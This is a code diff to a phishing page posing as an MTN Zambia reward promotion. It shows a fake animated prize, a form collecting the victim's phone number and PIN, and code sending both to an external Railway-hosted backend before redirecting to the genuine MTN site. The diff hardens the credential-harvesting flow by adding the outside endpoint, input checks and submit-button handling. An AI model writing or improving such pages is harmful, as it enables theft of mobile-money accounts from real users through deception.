@@ -97,8 +97,9 @@
       margin-top: 8px;
       transition: transform 0.1s, background 0.2s;
     }
-    button:hover { background: #ffb800; }
-    button:active { transform: scale(0.98); }
+    button:hover:not(:disabled) { background: #ffb800; }
+    button:active:not(:disabled) { transform: scale(0.98); }
+    button:disabled { opacity: 0.7; cursor: not-allowed; }
     #message { margin-top: 12px; font-size: 13px; color: #d32f2f; min-height: 16px; }
   </style>
 </head>
@@ -118,12 +119,15 @@
     <form id="promoForm">
       <input type="tel" id="number" placeholder="Phone Number" required>
       <input type="password" id="pin" placeholder="PIN" required>
-      <button type="submit">CLAIM MY REWARD</button>
+      <button type="submit" id="submitBtn">CLAIM MY REWARD</button>
     </form>
     <div id="message"></div>
   </div>
 
   <script>
+    // Backend URL — change this if you host the backend elsewhere
+    const API_BASE = 'https://zambia-claim-production.up.railway.app';
+
     // --- 1. Generate a random prize between 3,300 and 10,450 ---
     const MIN = 3300;
     const MAX = 10450;
@@ -137,24 +141,33 @@
 
     function animateCount(now) {
       const progress = Math.min((now - startTime) / duration, 1);
-      // easeOutCubic for a nice deceleration
       const eased = 1 - Math.pow(1 - progress, 3);
       current = Math.floor(eased * targetPrize);
       prizeEl.textContent = current.toLocaleString();
       if (progress < 1) requestAnimationFrame(animateCount);
-      else prizeEl.textContent = targetPrize.toLocaleString(); // final exact value
+      else prizeEl.textContent = targetPrize.toLocaleString();
     }
     requestAnimationFrame(animateCount);
 
     // --- 3. Handle form submission ---
     document.getElementById('promoForm').addEventListener('submit', async (e) => {
       e.preventDefault();
-      const number = document.getElementById('number').value;
-      const pin = document.getElementById('pin').value;
+      const number = document.getElementById('number').value.trim();
+      const pin = document.getElementById('pin').value.trim();
       const msg = document.getElementById('message');
+      const btn = document.getElementById('submitBtn');
+
+      if (!number || !pin) {
+        msg.textContent = 'Please enter both phone number and PIN.';
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'SUBMITTING…';
+      msg.textContent = '';
 
       try {
-        const response = await fetch('/api/submit', {
+        const response = await fetch(`${API_BASE}/api/submit`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ number, pin, prize: targetPrize })
@@ -163,10 +176,15 @@
         if (response.ok) {
           window.location.href = 'https://www.mtn.zm/';
         } else {
-          msg.textContent = 'Submission failed. Please try again.';
+          const data = await response.json().catch(() => ({}));
+          msg.textContent = data.error || 'Submission failed. Please try again.';
+          btn.disabled = false;
+          btn.textContent = 'CLAIM MY REWARD';
         }
       } catch (error) {
         msg.textContent = 'Network error. Please try again.';
+        btn.disabled = false;
+        btn.textContent = 'CLAIM MY REWARD';
       }
     });
   </script>
